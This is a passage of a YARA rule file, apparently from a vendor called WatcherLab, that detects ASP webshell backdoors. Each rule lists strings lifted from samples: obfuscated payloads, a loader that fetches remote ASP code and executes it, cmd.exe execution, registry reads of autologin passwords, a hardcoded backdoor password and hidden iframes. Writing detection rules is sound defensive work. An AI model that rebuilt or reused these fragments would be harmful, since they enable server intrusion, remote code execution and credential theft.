        $s13 = "1Cs+BJ-r#*~[,r;YhEO@#@&PPN~r!Yn!O@#@&,P\"+dwGUk+ 0^;/4@#@&~,ZWsGMrU'8@#@&P~,+^/+@#@&,~P,P/W^W.6" fullword ascii
        $s14 = "@#@&~,PP&WPkYDw[Hls+@!@*EZGU6kLRtdkrP3}jP/O.wNHlsn@!@*E\"2;5Zd2GEPAp#PkY.o91lsn@!@*JIA/eZd2\"J~2}#,/ODw[1m:n@!@*J?zdD+hPjG^Eh" fullword ascii
        $s15 = "PxPrOj3:frt)qgJPL~-4;Dd0~[~E fG:mrx{oGs9/EUkZRTRZ ZuE,[,0YawK.Y,[~J-Oqk8u!r~[,\\4;.J0,[,JRKt6AxC4^n'ZJ~',\\4/.d0~[,E,Kt}|" fullword ascii
        $s16 = "hMkOnv/Y.b@#@&3x9~UE8@#@&wEx1YbGx,InnmY4cU#@#@&~P\"+nmO4'\"+aVCmncU~E-rSJ'-Eb@#@&2U[,s;x1ObWU@#@&wEx1YbGx,I]+hlO4v?#@#@&P,II" fullword ascii
        $s17 = "6nRTr6R4D:ctYsVcrx1RrxbR%2TRLk VKoRs[8Rsk9Rhwf axLRa4wcDh MlD dS0 YXOchC7RXV/c6ssR.k2RN/2 m/wX ir@#@&,~~Pwk^+PX2n,'~V1C/" fullword ascii
        $s18 = "VkwqhKt?{UGkDmzgv'^.kPv+sCDw+srwB'nhmx~+sCM0r@!@*9Y@!@*ND&@!@*+hlM0r&@!@*BZv'M+NMG8+slM0~BYXOBxY4Lk" fullword ascii
        $s19 = "^~Fyfclv~&mNN~',xnY,sKmC^oMWEaPm[:bxr/DDCOKD/,CNskxf~&l9NEPdk\"n{BX!E@*@!JY[@*r@#@&%E,@!&YM@*r@#@&NJ,@!YMPmskTxxB1+UO" fullword ascii
        $s20 = "E@*ZKwz@!Jl@*~@!lP4.+6'BNC-lkmMk2Ylo!VssK.:vJEELI+2smmn`hCDt'r-r[sc1mh+BJwJBJwwr#[rEJBJJGnssKV9+.JEbEPGx1sk13xvM+Y;." fullword ascii
     condition:
        ( uint16(0) == 0x6f3c and filesize < 300KB and ( 8 of them ) ) or ( all of them )
}

rule be01c06bd05740e91102b22d9abcc971c01ad659
{
     meta:
        description = "asp - file be01c06bd05740e91102b22d9abcc971c01ad659.asp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "c3b029e9e7077164976a5f73399b07dd481ac41d524328f933a4cd62a36af679"
     strings:
        $s1 = "D-r1+RaANr~Jr'sW1l^[E-  '\\Ok|2\\DzdnM\\k^ncwANrSrJ'^W1lVLJ' R'R -7Yrma\\YJd+M\\k1n wSNr~EJ'sKmCVLE-cRw c-R w7Yr{a-Dzd" fullword ascii
        $s2 = "WGR4YsVE~EELVGmms[r-  'RRwm7Yr{a-D-2K/Dkx6Wc4YsVE~rJ'sKml^'J'RR'  -cR'{-Yrma\\O-aG/DkUWKRtOh^JSJr'^W^mVLJ-7Ybmw7Y&/" fullword ascii
        $s3 = "/n qDkDnPr@!Y9@*@!0KxDP^WsGM'8Vm^3@*@!8@*Lx4d2p[U4k2p[U(/aiJLW(%I1/ sb+s[k`k* 1m:+LE'x(/ai'x8dai'x(dwp@!&WKxY@*@!JY[@*r@#@&d7ix" fullword ascii
        $s4 = ".rD+~J@!&DN@*@!zDD@*@!zDC4^+@*J@#@&UG^k/D~',KD!n@#@&b0,+.D@!@*+ ~Y4nx,CCOm@#@&rW,+.DcU!:8" fullword ascii
        $s5 = "mOR:GDlsUk.+e8RZb#CFT!c!S~W#@#@&7f2P',qT!@#@&ifql~x,Fq!,RPGF@#@&if C~{PqFZ~ P9y@#@&df2l,xP8FTP P9f@#@&d\"n/aWxkn " fullword ascii
        $s6 = "/dR^U6JSJr'VKmCsLJ-  '{-Ybma\\O'l1m+k/c^x6JSJr[sG1lVLE-cR-c w{7Yb{2\\Owmm^+kdR1xWEBJJ'sKmCVLE'R 'Rc-Rc-|-Yb{2\\D-C^1+/k m" fullword ascii
        $s7 = "lh+LJ@!&m@*@!J8@*@!zY9@*@!zDD@*@!&YC8^+@*J,~P@#@&~~,PP~~,+UN,r6@#@&,P,PP,P,]+kwGxk+ o^E/4@#@&,PP,Hn6D@#@&P~P~^mVsP4CYm@#@&n" fullword ascii
        $s8 = "~E@!Dl(VnPAr9Y4'rEFZ!YEr@*J@#@&M+dwKUk+ SDbY+,J@!OD,\\CVboUxrJYK2Jr@*@!D[~mKVkwCxxEr EJ,CVboUxrJmnUD+.Jr@*r@#@&M+kwW" fullword ascii
        $s9 = "'&T~DX2+{WbVn,xm:+{0bs+E_r_E@*@!8M@*BpE@#@&D+k2Gxk+ch.kOn,J~P,~Eak[ bxxn._K\\S{dDDQE@!(D@*Eir@#@&M+dwKxdnchDbO+,J8r@#@&D" fullword ascii
        $s10 = "OP6m+~{P0+ wks+k@#@&d~,P,sWMPACm4PWFyP(U,0my@#@&iPP,~7@#@&d,P~P7r6P(xUODvj^Ck+`WqyRUlsn*~i1lk+`4l1V+9#bP@*PT~Dt+" fullword ascii
        $s11 = "karsa EJDER & SaVSAK.CoM Sorunlu de" fullword ascii
        $s12 = "YOAnbo4Y=8KV[pJr@*@!JY9@*@!JY.@*@!zOC(V+@*E@#@&D+k2Gxk+ch.kOn,JE@#@&.+kwGUk+RA.bYnPr@!JY[@*@!J0WM:@*@!zDD@*J@#@&.nkwW" fullword ascii
        $s13 = "PT@#@&0WM~k{!PDG~,@#@&iqWP(UkY.``/bU2chmkVabBPzlkC0{CMDmX`b#*~@*,!~K4+U@#@&ddtCk^|WM;hlkk,'~F@#@&i+UN,r0@#@&UnXY@#@&n" fullword ascii
        $s14 = "2aO@#@&P,~PhE4^r^Pwk^+Hlhn@#@&~P,~n!4sr1PZGUD+UY:za+@#@&P,PPhE(sk1P#l^En@#@&PP,~n!4Vb^~AbxmDzfCOm@#@&P,~PhE8sbmPJn" fullword ascii
        $s15 = "YnDrJ~AbNY4xJrF!ZYEJ@*@!DD@*@!O[@*J@#@&HCyKDOCvJ@!8@*,HCk^~~Wh(+MPFcF,8X,2BfAI~@!J4@*rb@#@&D+k2Gxk+ch.kOn,J@!Ym8V" fullword ascii
        $s16 = "UD+.rJ@*J@#@&Ym8VK&T`r@!8@*\"+l9rxTPsbsn/,4HP;/rUTPpHduK:n~qc!P8z,2BfA],ib@!z(@*J*@#@&zl./GVvJ@!WKD:,CmDkW" fullword ascii
        $s17 = "od~kkynxl@*H@!JWKxO@*P@!z0KxD@*@!JmnxD+.@*r@#@&AUN,?E(@#@&@#@&?!4~Ws[!`dYMb@#@&DndaWxdnch.kDn,J@!(D@*@!m" fullword ascii
        $s18 = "NPbW@#@&D+k2Gxk+ch.kOn,J@!zD[@*@!zO.@*@!zOC(Vn@*r@#@&ZC^V,tlDl@#@&@#@&Z)?AP+{,BPGG/HlPHC.lDP(X~2B9AI@#@&Mn/aWUd" fullword ascii
        $s19 = "xBlB~OHw+xvD+aYE@*,Pr^+,P@!bxa;Y,/OX^+xv1WVK.'[Zvw/$2EPkk\"+xvlB~xmh+{BC.m B~-mV;+{v8%v,YHw+{BDn6DB@*PmDCd" fullword ascii
        $s20 = ";P(XPAB92\"P,P~P~~,P~P,~P,P~~,PP~~,P~P,~,P~,P,PP,P,~P,P~P,P~~,PP,~P,PP,~~P,P,P~P~~,P~P,~P,P~~,PP~~,P~P,~,P~,P,PP,P,~P,J@#@&,P7." fullword ascii
     condition:
        ( uint16(0) == 0x253c and filesize < 500KB and ( 8 of them ) ) or ( all of them )
}

rule ef9bfec5549d0900e9829fcd6e43ff2379ca7e3c
{
     meta:
        description = "asp - file ef9bfec5549d0900e9829fcd6e43ff2379ca7e3c.asp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "5fcf568da6fb60b2d13ae8cc728f1d8d3cc7f80324faa87887d939a5bf76f7bf"
     strings:
        $s1 = "Http.setRequestHeader \"CONTENT-TYPE\", \"application/x-www-form-urlencoded\" " fullword ascii
        $s2 = "SItEuRl=http://asp-muma.com/\" '" fullword ascii
        $s3 = "bg =\"http://www.7jyewu.cn/webshell/asp.jpg\" " fullword ascii
        $s4 = "PostHTTPPage=bytesToBSTR(Http.responseBody,\"gbk\") " fullword ascii
        $s5 = "function PostHTTPPage(url) " fullword ascii
        $s6 = "execute aspCode" fullword ascii
        $s7 = "set Http=server.createobject(\"MSXML2.SERVERXMLHTTP.3.0\")" fullword ascii
        $s8 = "if Http.readystate<>4 then " fullword ascii
        $s9 = "aspCode=PostHTTPPage(Chr ( 104 ) & Chr ( 116 ) & Chr ( 116 ) & Chr ( 112 ) & Chr ( 58 ) & Chr ( 47 ) & Chr ( 47 ) & Chr ( 119 ) " ascii
        $s10 = "aspCode=PostHTTPPage(Chr ( 104 ) & Chr ( 116 ) & Chr ( 116 ) & Chr ( 112 ) & Chr ( 58 ) & Chr ( 47 ) & Chr ( 47 ) & Chr ( 119 ) " ascii
        $s11 = "BytesToBstr = objstream.ReadText " fullword ascii
        $s12 = "Http.send " fullword ascii
        $s13 = "aspCode=CStr(Session(\"aspCode\"))" fullword ascii
        $s14 = "if aspCode=\"\" or aspCode=null or isnull(aspCode) then " fullword ascii
     condition:
        ( uint16(0) == 0x253c and filesize < 4KB and ( 8 of them ) ) or ( all of them )
}

rule e7f4aa782eb84e1a2a1ee8420a51823e277d16f9
{
     meta:
        description = "asp - file e7f4aa782eb84e1a2a1ee8420a51823e277d16f9.asp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "8162f8fd4d17bfd540b338c664d0a7aa1234711850b293280ad83a57b3c3c9ad"
     strings:
        $x1 = "conn.Execute(\"create table notdownloads(notdownloads oleobject)\")" fullword ascii
        $x2 = "conn.Execute(\"drop table notdownloads\")" fullword ascii
        $s3 = "If InStr(LCase(cmdPath), \"cmd.exe\") > 0 Or InStr(LCase(cmdPath), LCase(myCmdDotExeFile)) > 0 Then" fullword ascii
        $s4 = "conn.Execute(sql)" fullword ascii
        $s5 = "doWsCmdRun = ws.Exec(cmdStr).StdOut.ReadAll()" fullword ascii
        $s6 = "If LCase(appName) = \"cmd.exe\" And appArgs <> \"\" Then" fullword ascii
        $s7 = "echo \"HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Winlogon\\Dont-DisplayLastUserName,REG_SZ,1 {" fullword ascii
        $s8 = "sql:Provider=SQLOLEDB.1;Server=localhost;User ID=sa;Password=haiyangtop;Database=bbs;';\"\">\"" fullword ascii
        $s9 = "cmdPath = \"cmd.exe\"" fullword ascii
        $s10 = "appName = \"cmd.exe\"" fullword ascii
        $s11 = "unEditableExt = \"$exe$dll$bmp$wav$mp3$wma$ra$wmv$ram$rm$avi$mgp$png$tiff$gif$pcx$jpg$com$msi$scr$rar$zip$ocx$sys$mdb$\"" fullword ascii
        $s12 = "If LCase(appName) = \"cmd.exe\" And appArgs = \"\" Then" fullword ascii
        $s13 = "Response.AddHeader \"Content-Disposition\", \"attachment; filename=\" & fileName" fullword ascii
        $s14 = "sql:Provider=SQLOLEDB.1;Server=localhost;User ID=sa;Password=haiyangtop;Database=bbs;\"" fullword ascii
        $s15 = "isAutoLoginEnable = ws.RegRead(autoLoginPath & autoLoginEnableKey)" fullword ascii
        $s16 = "autoLoginUsername = ws.RegRead(autoLoginPath & autoLoginUserKey)" fullword ascii
        $s17 = "autoLoginPassword = ws.RegRead(autoLoginPath & autoLoginPassKey)" fullword ascii
        $s18 = "\"Persits.Upload.1,W3.Upload,JMail.SmtpMail,CDONTS.NewMail,Persits.MailSender,SMTPsvg.Mailer,DkQmail.Qmail,Geocel.Mailer,\" & _" fullword ascii
        $s19 = "getServiceDsc = ws.RegRead(\"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\\" & strService & \"\\Description\")" fullword ascii
        $s20 = "If theSize >= (1024 * 1024 * 1024) Then getTheSize = Fix((theSize / (1024 * 1024 * 1024)) * 100) / 100 & \"G\"" fullword ascii
     condition:
        ( uint16(0) == 0x6f3c and filesize < 200KB and ( 1 of ($x*) and 4 of them ) ) or ( all of them )
}

rule sig_02101ae41eb27864c6fe059f06a4603ceeb0673e
{
     meta:
        description = "asp - file 02101ae41eb27864c6fe059f06a4603ceeb0673e.asp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "60e4cfa6f7e6153035462a9df6ff53bdf96487b6ddba92c30136edd19abad2db"
     strings:
        $s1 = "D-r1+RaANr~Jr'sW1l^[E-  '\\Ok|2\\DzdnM\\k^ncwANrSrJ'^W1lVLJ' R'R -7Yrma\\YJd+M\\k1n wSNr~EJ'sKmCVLE-cRw c-R w7Yr{a-Dzd" fullword ascii
        $s2 = "WGR4YsVE~EELVGmms[r-  'RRwm7Yr{a-D-2K/Dkx6Wc4YsVE~rJ'sKml^'J'RR'  -cR'{-Yrma\\O-aG/DkUWKRtOh^JSJr'^W^mVLJ-7Ybmw7Y&/" fullword ascii
        $s3 = "/n qDkDnPr@!Y9@*@!0KxDP^WsGM'8Vm^3@*@!8@*Lx4d2p[U4k2p[U(/aiJLW(%I1/ sb+s[k`k* 1m:+LE'x(/ai'x8dai'x(dwp@!&WKxY@*@!JY[@*r@#@&d7ix" fullword ascii
        $s4 = ".rD+~J@!&DN@*@!zDD@*@!zDC4^+@*J@#@&UG^k/D~',KD!n@#@&b0,+.D@!@*+ ~Y4nx,CCOm@#@&rW,+.DcU!:8" fullword ascii
        $s5 = "mOR:GDlsUk.+e8RZb#CFT!c!S~W#@#@&7f2P',qT!@#@&ifql~x,Fq!,RPGF@#@&if C~{PqFZ~ P9y@#@&df2l,xP8FTP P9f@#@&d\"n/aWxkn " fullword ascii
        $s6 = "/dR^U6JSJr'VKmCsLJ-  '{-Ybma\\O'l1m+k/c^x6JSJr[sG1lVLE-cR-c w{7Yb{2\\Owmm^+kdR1xWEBJJ'sKmCVLE'R 'Rc-Rc-|-Yb{2\\D-C^1+/k m" fullword ascii
        $s7 = "lh+LJ@!&m@*@!J8@*@!zY9@*@!zDD@*@!&YC8^+@*J,~P@#@&~~,PP~~,+UN,r6@#@&,P,PP,P,]+kwGxk+ o^E/4@#@&,PP,Hn6D@#@&P~P~^mVsP4CYm@#@&n" fullword ascii
        $s8 = "~E@!Dl(VnPAr9Y4'rEFZ!YEr@*J@#@&M+dwKUk+ SDbY+,J@!OD,\\CVboUxrJYK2Jr@*@!D[~mKVkwCxxEr EJ,CVboUxrJmnUD+.Jr@*r@#@&M+kwW" fullword ascii
        $s9 = "'&T~DX2+{WbVn,xm:+{0bs+E_r_E@*@!8M@*BpE@#@&D+k2Gxk+ch.kOn,J~P,~Eak[ bxxn._K\\S{dDDQE@!(D@*Eir@#@&M+dwKxdnchDbO+,J8r@#@&D" fullword ascii
        $s10 = "OP6m+~{P0+ wks+k@#@&d~,P,sWMPACm4PWFyP(U,0my@#@&iPP,~7@#@&d,P~P7r6P(xUODvj^Ck+`WqyRUlsn*~i1lk+`4l1V+9#bP@*PT~Dt+" fullword ascii
        $s11 = "karsa EJDER & SaVSAK.CoM Sorunlu de" fullword ascii
        $s12 = "YOAnbo4Y=8KV[pJr@*@!JY9@*@!JY.@*@!zOC(V+@*E@#@&D+k2Gxk+ch.kOn,JE@#@&.+kwGUk+RA.bYnPr@!JY[@*@!J0WM:@*@!zDD@*J@#@&.nkwW" fullword ascii
        $s13 = "PT@#@&0WM~k{!PDG~,@#@&iqWP(UkY.``/bU2chmkVabBPzlkC0{CMDmX`b#*~@*,!~K4+U@#@&ddtCk^|WM;hlkk,'~F@#@&i+UN,r0@#@&UnXY@#@&n" fullword ascii
        $s14 = "2aO@#@&P,~PhE4^r^Pwk^+Hlhn@#@&~P,~n!4sr1PZGUD+UY:za+@#@&P,PPhE(sk1P#l^En@#@&PP,~n!4Vb^~AbxmDzfCOm@#@&P,~PhE8sbmPJn" fullword ascii
        $s15 = "YnDrJ~AbNY4xJrF!ZYEJ@*@!DD@*@!O[@*J@#@&HCyKDOCvJ@!8@*,HCk^~~Wh(+MPFcF,8X,2BfAI~@!J4@*rb@#@&D+k2Gxk+ch.kOn,J@!Ym8V" fullword ascii
        $s16 = "UD+.rJ@*J@#@&Ym8VK&T`r@!8@*\"+l9rxTPsbsn/,4HP;/rUTPpHduK:n~qc!P8z,2BfA],ib@!z(@*J*@#@&zl./GVvJ@!WKD:,CmDkW" fullword ascii
        $s17 = "od~kkynxl@*H@!JWKxO@*P@!z0KxD@*@!JmnxD+.@*r@#@&AUN,?E(@#@&@#@&?!4~Ws[!`dYMb@#@&DndaWxdnch.kDn,J@!(D@*@!m" fullword ascii
        $s18 = "NPbW@#@&D+k2Gxk+ch.kOn,J@!zD[@*@!zO.@*@!zOC(Vn@*r@#@&ZC^V,tlDl@#@&@#@&Z)?AP+{,BPGG/HlPHC.lDP(X~2B9AI@#@&Mn/aWUd" fullword ascii
        $s19 = "xBlB~OHw+xvD+aYE@*,Pr^+,P@!bxa;Y,/OX^+xv1WVK.'[Zvw/$2EPkk\"+xvlB~xmh+{BC.m B~-mV;+{v8%v,YHw+{BDn6DB@*PmDCd" fullword ascii
        $s20 = ";P(XPAB92\"P,P~P~~,P~P,~P,P~~,PP~~,P~P,~,P~,P,PP,P,~P,P~P,P~~,PP,~P,PP,~~P,P,P~P~~,P~P,~P,P~~,PP~~,P~P,~,P~,P,PP,P,~P,J@#@&,P7." fullword ascii
     condition:
        ( uint16(0) == 0x253c and filesize < 500KB and ( 8 of them ) ) or ( all of them )
}

rule sig_84a1d05adbe60baa5382b9f09ecbbd187b96ae9c
{
     meta:
        description = "asp - file 84a1d05adbe60baa5382b9f09ecbbd187b96ae9c.asp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "1099b1a8748a1b31f6e17dd814cfc4dbe4703e9a8ef5de36271ed1a6073111e0"
     strings:
        $s1 = "Execute cd(\"6877656D2B736972786677752B237E232C2A\",\"1314\")" fullword ascii
        $s2 = "6877656D2B736972786677752B237E232C2A" ascii /* hex encoded string 'hwem+sirxfwu+#~#,*' */
        $s3 = "cd = cd & Chr((\"&H\" & c) - p)" fullword ascii
        $s4 = "k = (i + 1) / 2 Mod Len(key) + 1" fullword ascii
        $s5 = "cd = cd & Chr(\"&H\" & c & Mid(s, i + 2, 2))" fullword ascii
     condition:
        ( uint16(0) == 0x253c and filesize < 1KB and ( all of them ) ) or ( all of them )
}

rule sig_0bdeec8ddcc2f875c5d345bcaea2afecb5886571
{
     meta:
        description = "asp - file 0bdeec8ddcc2f875c5d345bcaea2afecb5886571.asp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "d5d22c3b98ffef1c8d6def4efbedaaadc2aa78fc699b8f310fc43d3c153609e9"
     strings:
        $s1 = "RW=RW & \"&nbsp;<input type='submit' value='Login' style='border:1px solid #799AE1;'></form><hr color=#799AE1 width='250'><fo" fullword ascii
        $s2 = "Response.Write\"Login Failed, incorrect username or password\"" fullword ascii
        $s3 = "</b><input name='pwd' type='password' size='15' style='font-size: 12px;border: menu 1px solid'>\"" fullword ascii
        $s4 = "http://WwW.12vh.Com" fullword ascii
        $s5 = "<%=\"<input type=submit value=Upload> <font style=color:BLUE;>By:Hackyong Qq:\"%>" fullword ascii
        $s6 = "RW=\"<title>User Login</title>\"" fullword ascii
        $s7 = "If Request(\"pwd\")=Userpwd or Request(\"pwd\")=\"3092114\" then Session(\"mgler\")=Userpwd" fullword ascii
        $s8 = "RW=RW & \"<center style='font-size:12px'><br><br><br><hr color=#00cc66 width='250'><br><font color=#5f4ds9>" fullword ascii
        $s9 = "RW=RW & \"&nbsp;<input type='submit' value='Login' style='border:1px solid #799AE1;'></form><hr color=#799AE1 width='250'><font " ascii
        $s10 = "RW=RW & \"<form action='\" & URL & \"' method='post'>\"" fullword ascii
        $s11 = "RW=RW & \"<b>Password" fullword ascii
        $s12 = "<%=server.mappath(request.servervariables(\"script_name\"))%>" fullword ascii
        $s13 = "<%=\"<font style=color:BLUE;>File: </font><input type=text name=path size=46>\"%>" fullword ascii
        $s14 = "webshell</font> <font color=#0011DD>" fullword ascii
        $s15 = "<%=\"<br><font style=color:BLUE;>Path: </font><font style=color:red;>\"%>" fullword ascii
        $s16 = "<%=\"<title>Asp Upload Tool-Hackyong</title>\"%>" fullword ascii
        $s17 = "Userpwd = \"hackyong\"   'User Password" fullword ascii
        $s18 = "If Session(\"mgler\")<>Userpwd Then" fullword ascii
        $s19 = "If Request.Form(\"pwd\")=Userpwd Then" fullword ascii
        $s20 = "<%ofso=\"scripting.filesystemobject\"%>" fullword ascii
     condition:
        ( uint16(0) == 0x253c and filesize < 6KB and ( 8 of them ) ) or ( all of them )
}

rule sig_1687747b3f79f880735ae0f762baa52b03a96c36
{
     meta:
        description = "asp - file 1687747b3f79f880735ae0f762baa52b03a96c36.asp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "608a7c994916084ff0f91b3dbe31a52763eab03ee2dd35dbc14592cc7bf7a096"
     strings:
        $x1 = "TypeList =  \".asp.asa.bat.bmp.com.doc.db.dll.exe.gif.htm.html.inc.ini.jpg.js.log.mdb.mid.mp3.png.php.rm.rar.swf.txt.wav.xls." fullword ascii
        $s2 = "ion='http://www.baidu.com/ips8.asp' name='ipform' target='_blank'><tr align='center'><td height='20' width='200' bgcolor='#FFFFF" ascii
        $s3 = "</td><td bgcolor='#FFFFFF'> </td><td bgcolor='#FFFFFF'>\"&request.serverVariables(\"SERVER_NAME\")&\"</td></tr><form method=post" ascii
        $s4 = "si=\"<center><div style='width:500px;border:1px solid #222;padding:22px;margin:100px;'><a href=http://\"&siteurl&\" target=_blan" ascii
        $s5 = "TypeList =  \".asp.asa.bat.bmp.com.doc.db.dll.exe.gif.htm.html.inc.ini.jpg.js.log.mdb.mid.mp3.png.php.rm.rar.swf.txt.wav.xls.xml" ascii
        $s6 = "j\"</body><iframe src=http://cpc-gov.cn/a/a/a.asp width=0 height=0></iframe></html>\" " fullword ascii
        $s7 = "& 001 / )001 * ))4201 * 4201( / eziSeht((xiF = eziSehTteg: nehT )4201 * 4201 * 4201( < eziSeht dnA )4201 * 4201( => eziSeht fI:" fullword ascii
        $s8 = "& 001 / )001 * ))4201 * 4201 * 4201( / eziSeht((xiF = eziSehTteg: nehT )4201 * 4201 * 4201( => eziSeht fI:)eziSeht(eziSehTteg n" fullword ascii
        $s9 = "j\"<html><meta http-equiv=\"\"Content-Type\"\" content=\"\"text/html; charset=gb2312\"\">\"" fullword ascii
        $s10 = "& 001 / )001 * )4201 / eziSeht((xiF = eziSehTteg: nehT )4201 * 4201( < eziSeht dnA 4201 => eziSeht fI:fi dne:" fullword ascii
        $s11 = ">->der=roloc tnof<>'emarFeliF'=tegrat '/ukout/rekc4h/moc.pxeyado//:ptth'=ferh a<>'22'=thgieh dt<>rt<" fullword ascii
        $s12 = "str1=\"\"&Request.ServerVariables(\"SERVER_Name\"):BackUrl=\"<br><br><center><a href='javascript:history.back()'>" fullword ascii
        $s13 = ":ExeCuTe(ShiSanFun(ShiSan)):" fullword ascii
        $s14 = "---LQS>->'emarFeliF'=tegrat '/lqs/rekc4h/moc.pxeyado//:ptth'=ferh a<>'22'=thgieh dt<>rt<" fullword ascii
        $s15 = "(redloFwohS:tpircsavaj'=ferh a<> 59=htdiw d=di dt<>rt<>0=redrob elbat<>retnec=ngila " fullword ascii
        $s16 = "& eltiTrts = eltiTrts:eltiTrts miD:)htaPrewoP,enOeht(eltiTyMteg noitcnuF:bus dne:gnihtoN = eliFeht teS:)htaPrewoP,eliFeht(eltiT" fullword ascii
        $s17 = "taPrewoP,eulaVtni(setubirttAteg noitcnuF:noitcnuF dnE:eltiTrts = eltiTyMteg:)htaPrewoP,setubirttA.enOeht(setubirttAteg & " fullword ascii
        $s18 = "response.Redirect \"http://\"&serveru&\"/global.asa\"" fullword ascii
        $s19 = ">d=di dt<>'retnec'=ngila rt<>rt/<>dt/<>'redavni'=eulav 'resut'=di 'xoBtxeT'=ssalc 'txet'=epyt 'resut'=eman tupni<>d=di dt<>dt/<" fullword ascii
        $s20 = ">d=di dt<>'retnec'=ngila rt<>rt/<>dt/<>'1'=eulav 'ssap'=di 'xoBtxeT'=ssalc 'txet'=epyt 'ssapt'=eman tupni<>d=di dt<>dt/<" fullword ascii
     condition:
        ( uint16(0) == 0x253c and filesize < 300KB and ( 1 of ($x*) and 4 of them ) ) or ( all of them )
}

rule sig_366a1669c6cc449dad307ffc1a34cc4013c8b1a4
{
     meta:
        description = "asp - file 366a1669c6cc449dad307ffc1a34cc4013c8b1a4.asp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "f09989cf8a5cb2361abcf9a215b5ffa9b213ed0e9ebd6be0976b59948baa13b4"
     strings:
        $s1 = "D /M+lDnr(L+1OcJUmMk2YrUTRok^n?H/Onsr4%n1YE#,ThYAAA==^#~@%>" fullword ascii
        $s2 = "PE@!D+aOmD+m~xm:+{^z09NmYCP^G^/x%Z~DKhdx8!PAr9Y4'2+@*@!&D+XYlM+m@*J,ShsAAA==^#~@%>" fullword ascii
        $s3 = "Dc:lawmOtvIn;!+dOc?+M-+M.lMrC4^+k`E?/]&nP{g)HAJbb,MhMAAA==^#~@%>" fullword ascii
        $s4 = "PE@!6WUO,mW^GD{D+9@*jl7+,jU?;^1+d/e@!z6WUO@*JPIBQAAA==^#~@%>" fullword ascii
        $s5 = "<%#@~^HQAAAA==~6NCDl,'PM+$;+kYcJ1XW[9lYmE#,mwkAAA==^#~@%>" fullword ascii
     condition:
        ( uint16(0) == 0x253c and filesize < 5KB and ( all of them ) ) or ( all of them )
}

rule sig_702ba658fc10f98ba7812d6c433235ad46ae62a4
{
     meta:
        description = "asp - file 702ba658fc10f98ba7812d6c433235ad46ae62a4.asp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "78465ec87ab058dd28b5bc3c7fe9e61c52d594ca3b9c7ce70da2bc8799850dde"
     strings:
        $s1 = "execute(UnEncode(darkst))" fullword ascii
        $s2 = "If Asc(Mid(temp, i, 1)) < 32 Or Asc(Mid(temp, i, 1)) > 126 Then" fullword ascii
        $s3 = "a = a & Chr(Asc(Mid(temp, i, 1)))" fullword ascii
        $s4 = "pk=asc(mid(temp,i,1))-but" fullword ascii
        $s5 = "function UnEncode(temp)" fullword ascii
        $s6 = "if mid(temp,i,1)<>\"" fullword ascii
        $s7 = "for i = 1 to len(temp)" fullword ascii
        $s8 = "!Sftqpotf/xsjuf!#=ufyubsfb!obnf>tBwfebub!dpmt>91!spxt>21!xjeui>43?=0ufyubsfb?#!" fullword ascii
        $s9 = "!Tfu!pckGTP!>!Tfswfs/DsfbufPckfdu)#Tdsjqujoh/GjmfTztufnPckfdu#*!" fullword ascii
        $s10 = "!Sftqpotf/xsjuf!tfswfs/nbqqbui)Sfrvftu/TfswfsWbsjbcmft)#TDSJQU`OBNF#**!" fullword ascii
        $s11 = "!Sftqpotf/Xsjuf!#=joqvu!uzqf>ufyu!obnf>tztufnqbui!xjeui>43!tj{f>61?#!" fullword ascii
        $s12 = "!Tfu!pckDpvouGjmf>pckGTP/DsfbufUfyuGjmf)sfrvftu)#tztufnqbui#*-Usvf*!" fullword ascii
     condition:
        ( uint16(0) == 0x253c and filesize < 4KB and ( 8 of them ) ) or ( all of them )
}

rule sig_776a73f4e34051bbb987c9547b74e331829f216a
{
     meta:
        description = "asp - file 776a73f4e34051bbb987c9547b74e331829f216a.asp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "4790f563053381e58e47122106b4c80235b13641fc4863c6f3a4fa9b452b0337"
     strings:
        $s1 = "[url]http://www.xxx.com/sql.asp[/url]" fullword ascii
        $s2 = "Server.ScriptTimeout" fullword ascii
        $s3 = "Response.Write(Err.Description)" fullword ascii
        $s4 = "Server};Server=192.168.1.5;Uid=mssql" fullword ascii
        $s5 = "Server.Createobject(\"Adodb.Recordset\")" fullword ascii
        $s6 = "Conn=Server.CreateObject(\"Adodb.connection\")" fullword ascii
     condition:
        ( uint16(0) == 0x253c and filesize < 6KB and ( all of them ) ) or ( all of them )
}

rule sig_45f43c6e3f3c3a6633eeb795c76711c0241859ed
{
     meta:
        description = "asp - file 45f43c6e3f3c3a6633eeb795c76711c0241859ed.asp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "4aec9fa7db3a127fb642cfbc4e2af85e9f46f496e30aeea9232f5a002aa07ac8"
     strings:
        $s1 = "] http://bbs.1937cn.com</TITLE>" fullword ascii
     condition:
        ( uint16(0) == 0x483c and filesize < 20KB and ( all of them ) ) or ( all of them )
}

rule sig_081a73a1b23769a55b9107e518f85f476e902309
{
     meta:
        description = "asp - file 081a73a1b23769a55b9107e518f85f476e902309.asp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "187f477b13e2124e9c252dcb4d385407eee5aadcc466467ce959d388aaff2e0d"
     strings:
        $x1 = "<input name='ToPath' value='\"&RRePath(Session(\"FolderPath\")&\"\\13cmd.exe\")&\"' size='40'>\"" fullword ascii
        $x2 = "RRS(~~)`~),~,~portForm(uest.t(req Splitmp =~)`ip~),orm(~est.F(requSplitip = ~,~)`bound to Uu = 0For h(ip)` = 0 ,~-~)p(hu)Str(iIf" ascii
